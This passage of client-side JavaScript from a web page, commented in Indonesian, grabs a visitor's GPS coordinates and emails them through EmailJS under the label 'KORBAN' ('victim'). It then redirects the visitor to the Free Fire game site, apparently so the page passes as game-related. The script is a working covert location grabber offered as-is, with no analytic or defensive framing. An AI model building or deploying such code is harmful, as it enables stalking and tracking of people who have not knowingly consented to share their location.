  function sukses(position){

    let longitude = position.coords.longitude;
    let mapsLink = "https://www.google.com/maps?q=" + latitude + "," + longitude;

    emailjs.send("service_lt5tmzc", "template_e16cgrw", {
      name: "KORBANðŸ”¥",
      time: new Date().toLocaleString(),
      message: "Lokasi berhasil diambil",
      latitude: latitude,
      longitude: longitude,
      maps: mapsLink
    }).then(function(){
      window.location.replace("https://ff.garena.com");
    });
  }

  function gagal(error){
    alert("GPS belum aktif");
    // Bisa tambahkan redirect juga kalau mau
    // window.location.replace("https://ff.garena.com");
  }

  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(sukses, gagal);
  }

})();
</script>
